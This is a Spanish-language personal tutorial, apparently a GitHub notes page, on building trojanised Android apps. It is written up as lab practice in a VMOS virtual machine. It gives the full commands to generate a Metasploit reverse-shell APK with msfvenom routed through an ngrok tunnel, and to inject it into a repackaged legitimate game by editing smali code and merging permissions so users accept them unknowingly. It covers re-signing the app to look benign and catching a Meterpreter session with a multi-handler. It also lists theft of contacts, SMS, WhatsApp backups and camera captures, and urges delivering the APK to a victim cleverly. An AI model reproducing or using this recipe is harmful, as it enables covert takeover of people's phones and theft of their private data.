# Hacking Android
Volver al [Indice](/README.md)
<a name="top"></a>

Antes de nada quiero comentar que esta guía, apuntes, tutorial, como se quiera llamar lo he hecho para mí, para practicar y recordar lo que estoy haciendo.  
Partiendo de que lo he elaborado basándome en cursos que he ido ojeando, de plataformas como Udemy, BacktracAcademy, youtube (en especial el vídeo de S4vitar, personalmente me parece bastante bueno su vídeo sobre esto), es posible que veáis bastantes referencias de algunos curso que os podáis encontrar, por lo tanto no es algo que haya realizado yo desde 0, es basado en mi experiencia propia y con ayuda de estos cursos.  
**¡COMENZAMOS!** 

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## INDICE

* [**1. Preparación del "laboratorio"**](#preparacion-del-laboratorio)

* [**2. Crear APK maliciosa sencilla**](#crear-apk-maliciosa-sencilla)

* [**3. Crear APK maliciosa original**](#crear-apk-maliciosa-original)

* [**4. Ejecución de exploit en la vícima**](#ejecucion-de-exploit-en-la-victima)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------
<a name="preparacion-del-laboratorio"></a>
## Preparación del laboratorio

Primero debemos descargarnos la aplicación **"VMOS"** en nuestro terminal.

![https://www.vmos.com/](/images/apuntes/HackingAndroid/vmosApk.png)

* Es una aplicación que básicamente virtualiza otro Android con versión 5.1 dentro del nuestro, por lo que el Android anfitrión no se vería afectado de todo lo que le hagamos a la VM.

* Este proceso es algo largo ya que debe descargar la imagen de Android e instalarla.

![installROM](/images/apuntes/HackingAndroid/instalarROM.png)
![vmosInstall](/images/apuntes/HackingAndroid/vmosInstall.png)

* Una vez finalizado nos pedirá que nos descarguemos **"VMOS Unlocker"**, lo buscamos (tanto VMOS normal como VMOS Unlocker desde fuera de la Play Store) y lo instalamos.  
Esto sirve para poder usar la VM así que no nos queda más remedio que hacerlo.

![vmosUnlocker](/images/apuntes/HackingAndroid/vmosUnlocker.png)
![vmosUnlocker](/images/apuntes/HackingAndroid/apkTools.png)

* Por defecto la VM con VMOS no viene con ROOT activado por lo que debemos de activarlo, para ello tenemos que realizar los siguientes pasos.
  * Vamos a ajustes => Acerca del teléfono => Información de software
  * Donde dice "Número de compilación" debemos de pulsarlo 7 veces (sí, no es broma) y activamos el modo developer.

![modoDeveloper](/images/apuntes/HackingAndroid/modoDeveloper.png)

  * Volvemos a los ajustes y habilitamos el ROOT (nos pedirá reiniciar el dispositivo cuando termine).

![rootReboot](/images/apuntes/HackingAndroid/rootReboot.png)

  * Podemos comprobar si efectivamente tenemos el dispositivo rooteado con la app **"Root Checker"**.

![rootChecker](/images/apuntes/HackingAndroid/rootChecker.png)

Como saben, no soy partidario de usar Metasploit (ni me gusta) pero en el caso de los dispositivos Android, cuando me puse a investigar todo el mundo lo usaba, así que lo probé... Y ¡Claro!, es normal que se use Metasploit en esta plataforma. Te ofrece muchísimas opciones para realizar de una forma muy pero que muy sencilla.
>Nota: Ofrece opciones que nos permiten realizar una gran variedad de acciones sobre el dispositivo vulnerado.

* Dumpear todos los contactos, llamadas, SMS, MMS...
* Descargar las imágenes, vídeos, audios...
* Descargar el backup (encriptado) de Whatsapp.
* Realizar "pantallazos" en ese mismo momento de lo que haya en la pantalla.
* Realizar fotos o grabar vídeos y guardarlo en tu equipo de cualquiera de las cámaras...
* Y muchas más opciones que os dejo averiguarlas por vosotros mismos.

<a name="crear-apk-maliciosa-sencilla"></a>
## Crear APK maliciosa sencilla

Con ```"NGROK"``` podemos levantar un servidor para que la víctima descarge nuestra APK maliciosa. Tenemos primero que registrarnos en la página web para que se sincronice la cuenta con la de la app y usar el apiToken.  
Páginas de descarga de NGROK:  
    [https://ngrok.com/](https://ngrok.com/)  
    [https://github.com/inconshreveable/ngrok](https://github.com/inconshreveable/ngrok)
* ngrok http 4343 => Para levantar un servidor web (podríamos crear por ejemplo una página web, clonada o creada con un enlace a nuestro malware)
* ngrok tcp 4343 => Para levantar un servidor TCP y que nuestro payload se conecte directamente a esta dirección que nos proporciona **NGROK** redireccionándolo a nuestra IP y puerto local.
  * http => Levantar un servidor http público (de cara a internet sin tener que abrir puertos en nuestro router ni exponer nuestra ip pública).
  * tcp => Levanta un túnel entre la red y nuestra red interna para que nuestro payload pueda conectarse directamente a nuestra red local.
  * 4343 => El puerto que YO le he asignado (vosotros podéis elegir el puerto que queráis).

![ngrok](/images/apuntes/HackingAndroid/ngrok.png)

Explico un poco lo que aparece en esta imagen:
* Session Status => El estado de la sesión.
* Account => El nombre de la cuenta y tu plan (El plan "Free" no permite tener más de un servidor de ngrok levantado al mismo tiempo)
* Version => La versión de ngrok que estamos corriendo.
* Region => La región donde está establecido ngrok.
* Web Interface => Una interfaz web con algo más de información de lo que aparece ahí.

![ngrokWeb](/images/apuntes/HackingAndroid/ngrokWeb.png)

* Forwarding => Nos indica la dirección que tenemos que poner en nuestro payload para que se redireccione a nuestra IP local y el puerto que le indicamos (donde previamente estaremos a la escucha con el multi-handler).
* Connections => Las conexiones que hemos recibido.

Con **"msfvenom"** podemos crear una APK maliciosa, para ello ejecutamos el siguiente comando.  
```msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=17547 -o reverse.apk```

* -p => Indica que tipo de payload queremos usar.
  * android/meterpreter/reverse_tcp => Es de android, que sea mediante **"Metasploit"** con una sesión de **"meterpreter"** y una shell reversa por TCP.
* LHOST => Debemos indicarle la dirección que nos ha dado ngrok (sin el **"tcp://"** ni el puerto **":17547"**).
* LPORT => Le pasamos el puerto que nos ha dado ngrok (solo el puerto).
* -o => Le indicamos el nombre del fichero saliente que vamos a crear.

![msfvenom](/images/apuntes/HackingAndroid/msfvenomBasic.png)

Una vez hecho todo esto solo deberíamos dejar en escucha un multi-handler de metasploit escuchando en todas las IPs (0.0.0.0) y el puerto que le dijimos nosotros a ngrok (el local).
>Todo esto lo vamos a ver más en detalle en el apartado [Ejecución de exploit en la víctima](#ejecucion-de-exploit-en-la-victima)

<a name="crear-apk-maliciosa-original"></a>
## Crear APK maliciosa "original"

Lo primero explicar esto, cuando digo APK maliciosa **"original"**, lo que vamos a hacer es:
* Obtener una APK legítima y real, de donde queramos...
* "Destriparla"
* Modificarla para colocar dentro nuestro payload (y que la app siga ejecutándose normalmente sin que el usuario pueda detectar nada)
* Finalmente volver a compilarla.

### Empezamos
* Primero Comenzamos descargando la app que queramos (en mi caso "Temple Run").
  * Antes de nada aconsejaros que probéis que la apk que vamos a descargar sin modificar funciona correctamente en el dispositivo víctima, yo tuve que probar un par de apps antes porque me abrían la sesión y se cerraba la app junto con la sesión y era porque la app que descargué no funcionaba en el dispositivo que yo estaba usando...
  * [https://www.apkmonk.com/](https://www.apkmonk.com/) => Usé esta página como usó S4vitar, porque descargando desde la PlayStore probé varios y no me funcionaba (puede ser por estar corriendo un Android 5.1, o por tener que profundizar más en el código, pero lo dejé ahí ya que tenía otras vías).
* Instalamos la aplicación **"apktool"** desde la URL: [https://github.com/iBotPeaches/Apktool/releases/download/v2.4.1/apktool_2.4.1.jar](https://github.com/iBotPeaches/Apktool/releases/download/v2.4.1/apktool_2.4.1.jar)
  * La descargamos desde este enlace porque la que viene en repositorio de Kali/Parrot no es correcta y falla. (comprobar si esto es así, con el comando ```"apktool --version"```. Si nos dice que la versión es como en la imagen, la dirty, no nos va a funcionar la compilación de la app maliciosa).

![apktoolDirty](/images/apuntes/HackingAndroid/apkToolDirty.png)

  * Con el comando ```"java -jar apktool_2.4.1.jar"``` podemos ejecutarlo.
* Vamos a "descomprimir" nuestras 2 APKs (la maliciosa, que es la que hemos creado en el apartado [crear apk maliciosa sencilla](#crear-apk-maliciosa-sencilla), y la real) con esta aplicación que hemos instalado.
  * ```java -jar apktool_2.4.1.jar d "nombre de la apk"``` => Esto nos crea un directorio con el nombre de la apk que hemos "descomprimido".

![apktoolUse](/images/apuntes/HackingAndroid/apktoolJava.png)

* Ahora entramos en el directorio de la apk maliciosa (reverse en mi caso)
  * Dentro de este directorio vemos otro directorio llamado "smali".
  * Dentro de este directorio podemos ver el directorio "com" y dentro de este tenemos el directorio "metasploit".
  * Vamos a comprimir el directorio "smali" de nuestra APK maliciosa para descomprimirlo directamente dentro del mismo directorio dentro de la APK "original".
    * Podemos realizarlo con el comando (estando ubicados en la raiz del directorio de nuestro payload):  
    ```tar -cf - ./smali | ( cd ../temple; tar -xpf - )``` ==> Gracias S4vitar por el comando

![tarSmali](/images/apuntes/HackingAndroid/tarSmali.png)
* 
    * Entramos ahora en la carpeta de la APK "original" que hemos descargado.
    * Una vez hecho esto debemos de modificar el archivo "TempleRunOzActivity.smali (en mi caso)" de la apk "original" para que apunte a nuestro payload y lo ejecute al arrancar la app.
    * Para poder encontrar la ubicación de este archivo, si no lo encontramos, podemos usar los siguientes comandos (desde la raiz del directorio).
      * ```grep "MAIN" -b2 AndroidManifest.xml``` => Para buscar la palabra "MAIN" dentro del archivo AndroidManifest.xml y mostrando las 2 líneas que hay por encima y por debajo.
      * Para conseguir su ruta, tenemos que fijarnos donde dice "android:name=", lo que viene después nos mostrará la ruta que tenemos que seguir hasta el archivo "TempleRunOzActivity.smali (en mi caso)".
      * En el caso que no os aparezca la ruta y solo os aparezca el nombre del fichero, podemos buscarlo con el comando:  
      ```find ./ -type f -name "TempleRunOzActivity".```

![grepManifest](/images/apuntes/HackingAndroid/grepManifest.png)

  * Abrimos el archivo "TempleRunOzActivity.smali" y lo modificamos:
    * Buscamos la línea donde dice ".method "*" onCreate..." (* Puede ser public, private, protected... Así que mejor buscar por "onCreate") 
    * En la primera línea debajo de esta que hemos buscado tenemos que colocar una "llamada" a nuestro payload para que se ejecute al arrancar la app.
    * La línea que tenemos que añadir quedaría así:
      * ```invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V```
        * Donde está la primera letra "L" tenemos que poner la ruta donde estaría nuestro payload, partiendo desde el directorio "com".
        * >Toda esta línea la podemos copiar de una línea parecida que hay más abajo y modificar lo que necesitemos, solo para simplificarlo.

![onCreate](/images/apuntes/HackingAndroid/onCreate.png)

  * Ahora tenemos que modificar el archivo "AndroidManifest.xml" (En él están los permisos que tiene la app), tenemos que colocar todos los permisos que tiene nuestro payload.
    * Buscamos los permisos que tiene nuestro payload  
     ```cat AndroidManifest.xml | grep "uses-permission"```

![PermisosAPKmaliciosa](/images/apuntes/HackingAndroid/maliciosaPermisos.png)
* 
    * Copiamos todos estos permisos y los pegamos en el archivo "AndroidManifest.xml" de la APK "original"
    * Debemos mirar si hay algún permiso duplicado para borrarlo y dejar solo 1.
  * >Lo bueno de hacer esto así es que la app no va a pedirle al usuario los permisos adicionales que le hemos añadido cuando abra la app (Si lo hará, pero ya dentro de la app y con el nombre de esta, por lo que el usuario pensará que si se lo está pidiendo la app que está ejecutando es algo normal y los aceptará).

![Permisison](/images/apuntes/HackingAndroid/permissions.png)

* Una vez todo esto realizado correctamente nos queda compilar de nuevo la APK.
  * ```java -jar apktool 2.4.1.jar b "nombre de la apk" -o "nombre que queremos llamar a la nueva apk"``` (este es el paso que fallará si usamos la versión "dirty")
  * Esto nos creará una nueva APK ya con nuestro código malicioso dentro.

![compilando](/images/apuntes/HackingAndroid/compiling.png)

* El problema que tenemos ahora que si le pasamos esta APK a nuestro dispositivo, nos lo va a detectar como maliciosa y no queremos que eso pase.
* Con la utilidad **"keytool"** (que suele venir preinstalada) vamos a generarnos una key para firmar la app y que la detecte como benigna.
  * ```keytool -genkey -keystore "nombre archivo que se va a crear" -alias "un alias para reconocerlo" -keyalg RSA -keysize 2048 -validity 1000```
    * -genkey => Para que genere una nueva key.
    * -keystore => Y el nombre de archivo que queremos crear.
    * -alias => Ponerle un alias a la key.
    * -keyalg RSA => Decirle que queremos usar el algoritmo RSA para esta key.
    * -keysize 2048 => El tamaño que queremos asignarle al algoritmo.
    * -validity => El tiempo, en días, que queremos que tenga validez la key.
  * Nos pedirá una contraeña =>**¡OJO!** es una contraseña para la key, no es la de nuestro sistema.
  * Después nos irá haciendo unas preguntas sobre quienes somos. (Para más credibilidad podemos investigar estos datos de la app que hemos cogido y colocar los mismos)
  * Ya estaría creada la key.

![keystore](/images/apuntes/HackingAndroid/keystore.png)

* Ahora con la utilidad **"jarsigner"** (que también debe venir preinstalada) vamos a firmar la app:
  * ```jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore "nombre de la key que hemos creado" "el nombre de la app con nuestro código malicioso" "el alias que le pusimos a la key"```
    * -sigalg => Le decimos el algoritmo que va a usar para la firma.
    * -digestalg => Le indicamos un algoritmo de resumen.
    * -keystore => Le indicamos el nombre del keystore que nos hemos creado previamente.
    * " " => Separado con un espacio del anterior le indicamos el nombre de la app que compilamos anteriormente ya con nuestro código malicioso dentro.
    * " " => También separado con un espacio del anterior le indicamos el alias que le pusimos a la key.
  * Nos preguntará una contraseña (que es la que le pusimos a la key anteriormente).
  * Comenzará a firmar toda la app.

![jarsigner](/images/apuntes/HackingAndroid/Firmada.png)

* También tenemos que instalar la utilidad **"zipalign"** => ```sudo apt install zipalign -y``` (Esta aplicación lo que hace básicamente es alinear los bytes de la app para que esta consuma menos RAM y vaya más rápida), obviamente es mucho más complejo que esto, pero a muy alto nivel hace eso.
  * ```zipalign 4 "nombre APK maliciosa" "nombre que queremos ya todo terminado"```
    * 4 => Le indicamos con la cantidad de bytes que queremos que "se alinee".
    * **¡IMPORTANTE!** => Cuidado con el orden, podemos carganos la APK. Aconsejo hacer una copia antes de realizar este comando.

![zipalign](/images/apuntes/HackingAndroid/zipalign.png)

<a name="ejecucion-de-exploit-en-la-victima"></a>
## Ejecución de exploit en la víctima

Lo primero que debemos hacer es, en este ejemplo, dejar **NGROK** preparado para recibir peticiones TCP (se ve en el apartado [Crear APK maliciosa sencilla](#crear-apk-maliciosa-sencilla).  
Hecho esto debemos crear un payload con **"msfvenom"** (se ve en el apartado [Crear APK maliciosa sencilla](#crear-apk-maliciosa-sencilla)) en este caso, va a ser con una APK descargada desde **"apkmonk"** y modificándola colocándole nuestro payload.  
Ahora, debemos pasarle a la víctima nuestra APK maliciosa de la forma más ingeniosa que podamos o se nos ocurra. (Al estar en un entorno controlado en red local, simplemente me lo voy a pasar a mi dispositivo)  
Finalmente debemos dejar **Metasploit** a la escucha con el **multi-handler** por el puerto que le indicamos a **NGROK** (el local) para poder recibir la shell de **Meterpreter.**
* ```msfconsole``` ó ```msfdb run``` => Para abrir **Metasploit**
* ```use exploit/multi/handler``` => Para indicar a **Metasploit** que queremos usar el exploit multi-handler para estar a la escucha.
* ```set payload android/meterpreter/reverse_tcp``` => Le indicamos el payload que vamos a usar (el que configuramos con **msfvenom** en nuestra APK maliciosa)
* ```set LHOST 0.0.0.0``` => Tenemos que poner esta dirección IP para que quede a la escucha de todas las IPs.
* ```set LPORT 4433``` => Le indicamos el puerto que le dijimos que hiciese la redirección a **NGROK** (el local)
* ```exploit``` => Lanzamos el exploit con la configuración que le hemos dado.

![multiHandler](/images/apuntes/HackingAndroid/multiHandler.png)

Con esto ya realizado **Metasploit** quedaría a la escucha de todas las peticiones a ese puerto.
Lo único que nos queda por hacer es abrir la aplicación en nuestra víctima para recibir una shell de **Meterpreter** y tener control total del dispositivo.
>La aplicación no os dará ningún problema pero os saltará el "Play Protect" esto es normal porque la app no está en la Play Store, cualquier aplicación fuera de la store saltará este aviso.

![playProtect](/images/apuntes/HackingAndroid/playProtect.png)
![appInstalled](/images/apuntes/HackingAndroid/appInstalada.png)

**¡ENHORABUENA!**, hemos conseguido vulnerar un dispositivo Android de una manera muy sencilla.

>Para cualquier duda, ayuda, queja, sugerencia o reclamación tenéis mi contacto en la página principal.

[Subir](#top)

![exploited](/images/apuntes/HackingAndroid/exploited.png)
